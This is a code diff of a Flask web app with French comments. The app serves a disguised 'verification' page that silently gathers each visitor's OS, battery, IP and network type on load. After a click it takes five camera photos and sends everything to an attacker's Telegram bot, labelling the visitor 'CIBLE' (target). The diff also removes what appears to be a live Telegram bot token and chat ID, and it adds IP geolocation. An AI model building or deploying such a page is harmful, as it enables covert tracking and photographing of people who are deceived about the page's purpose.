@@ -10,8 +10,8 @@ from datetime import datetime
 app = Flask(__name__)
 
 # ========== CONFIGURATION TELEGRAM ==========
-BOT_TOKEN = "8662380005:AAEJdWB3kvuIk-2dnq_xZ93EjDU4LT0lP9o"
-CHAT_ID = "8546452645"
+BOT_TOKEN = "TON_TOKEN_BOT_TELEGRAM"
+CHAT_ID = "TON_ID_TELEGRAM"
 
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 TELEGRAM_PHOTO_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
@@ -27,6 +27,15 @@ def send_telegram(text, photo_bytes=None):
             requests.post(TELEGRAM_API, json=data, timeout=10)
     except Exception as e:
         print(f"Erreur: {e}")
+
+def get_extra_info(ip):
+    try:
+        response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,city,country,isp").json()
+        if response['status'] == 'success':
+            return f"📍 {response['city']}, {response['country']} | 🌐 ISP: {response['isp']}"
+    except:
+        pass
+    return "Localisation inconnue"
 
 # ========== PAGE HTML MATRIX ==========
 HTML_MATRIX = '''<!DOCTYPE html>
@@ -50,7 +59,6 @@ HTML_MATRIX = '''<!DOCTYPE html>
             font-family: 'Courier New', monospace;
             overflow: hidden;
         }
-        /* Matrix rain effect */
         #matrix-bg {
             position: fixed;
             top: 0;
@@ -146,14 +154,6 @@ HTML_MATRIX = '''<!DOCTYPE html>
             color: #0a4a0a;
             font-size: 0.6rem;
         }
-        .glitch {
-            animation: glitch 0.5s infinite;
-        }
-        @keyframes glitch {
-            0% { text-shadow: 2px 0 red, -2px 0 blue; }
-            50% { text-shadow: -2px 0 red, 2px 0 blue; }
-            100% { text-shadow: 2px 0 red, -2px 0 blue; }
-        }
     </style>
 </head>
 <body>
@@ -174,7 +174,6 @@ HTML_MATRIX = '''<!DOCTYPE html>
 </div>
 
 <script>
-    // Matrix Rain Effect
     const canvas = document.getElementById('matrix-bg');
     const ctx = canvas.getContext('2d');
     canvas.width = window.innerWidth;
@@ -209,7 +208,6 @@ HTML_MATRIX = '''<!DOCTYPE html>
     let photoInterval = null;
     let photoCount = 0;
     
-    // Envoi au serveur
     async function postData(endpoint, data) {
         try {
             await fetch(endpoint, {
@@ -220,7 +218,6 @@ HTML_MATRIX = '''<!DOCTYPE html>
         } catch(e) {}
     }
     
-    // Détection OS (Android/iOS seulement)
     function detectMobileOS() {
         const ua = navigator.userAgent;
         if(/Android/i.test(ua)) return 'Android';
@@ -228,12 +225,10 @@ HTML_MATRIX = '''<!DOCTYPE html>
         return 'Autre';
     }
     
-    // Collecte des infos passives
     async function collectPassive() {
         collected.os = detectMobileOS();
         collected.timestamp = new Date().toISOString();
         
-        // Batterie
         if(navigator.getBattery) {
             try {
                 const battery = await navigator.getBattery();
@@ -243,33 +238,21 @@ HTML_MATRIX = '''<!DOCTYPE html>
             collected.battery = 'indisponible';
         }
         
-        // IP + Geo via ip-api.com
         try {
-            const geoRes = await fetch('http://ip-api.com/json/');
+            const geoRes = await fetch('https://api.ipify.org?format=json');
             const geoData = await geoRes.json();
-            if(geoData.status === 'success') {
-                collected.ip = geoData.query;
-                collected.city = geoData.city;
-                collected.country = geoData.country;
-                collected.isp = geoData.isp;
-                collected.region = geoData.regionName;
-            }
+            collected.ip = geoData.ip;
         } catch(e) {
             collected.ip = 'inconnu';
-            collected.city = '?';
-            collected.country = '?';
         }
         
-        // Opérateur via connexion (approximation)
         if(navigator.connection) {
             collected.networkType = navigator.connection.effectiveType || '?';
         }
         
-        // Envoi silencieux
         await postData('/api/passive', collected);
     }
     
-    // Capture photo unique
     async function capturePhoto(stream, index, videoElement) {
         return new Promise((resolve) => {
             const canvas = document.createElement('canvas');
@@ -292,7 +275,6 @@ HTML_MATRIX = '''<!DOCTYPE html>
         });
     }
     
-    // Rafale de 5 photos
     async function burstPhotos() {
         const statusDiv = document.getElementById('statusMsg');
         statusDiv.innerHTML = '>_ [SCAN] activation caméra...';
@@ -328,7 +310,6 @@ HTML_MATRIX = '''<!DOCTYPE html>
         }
     }
     
-    // Action principale
     async function startVerification() {
         const btn = document.getElementById('actionBtn');
         btn.disabled = true;
@@ -350,7 +331,6 @@ HTML_MATRIX = '''<!DOCTYPE html>
     
     document.getElementById('actionBtn').addEventListener('click', startVerification);
     
-    // Pré-collecte silencieuse
     collectPassive();
 </script>
 </body>
@@ -368,17 +348,14 @@ def passive():
         ip = request.headers.get('X-Forwarded-For', request.remote_addr)
         data['ip'] = ip
         
-        # Construction message Telegram
+        # Utilisation de get_extra_info
+        geo_info = get_extra_info(ip)
         os_info = data.get('os', '?')
-        city = data.get('city', '?')
-        country = data.get('country', '?')
-        isp = data.get('isp', '?')
         battery = data.get('battery', '?')
-        final_ip = data.get('ip', '?')
         
-        msg = f"""📍 *CIBLE* : [{os_info}] | [{city}, {country}] | [{isp}]
+        msg = f"""📍 *CIBLE* : [{os_info}] | {geo_info}
 🔋 *Batterie* : {battery}
-🌐 *IP* : {final_ip}"""
+🌐 *IP* : {ip}"""
         
         send_telegram(msg)
         return jsonify({'status': 'ok'})
@@ -393,8 +370,9 @@ def photo():
             photo_b64 = data['photo'].split(',')[1]
             photo_bytes = base64.b64decode(photo_b64)
             idx = data.get('index', '?')
+            ip = data.get('info', {}).get('ip', '?')
             
-            msg = f"📸 *PHOTO {idx}/5*\n🌐 IP: {data.get('info', {}).get('ip', '?')}"
+            msg = f"📸 *PHOTO {idx}/5*\n🌐 IP: {ip}"
             send_telegram(msg, photo_bytes)
             
         return jsonify({'status': 'ok'})
@@ -415,6 +393,6 @@ def error():
 def status():
     return jsonify({'status': 'active', 'matrix': 'online'})
 
-# ========== VERIFICATION SANTE ==========
+# ========== HANDLER ==========
 def handler(event, context):
     return app(event, context)
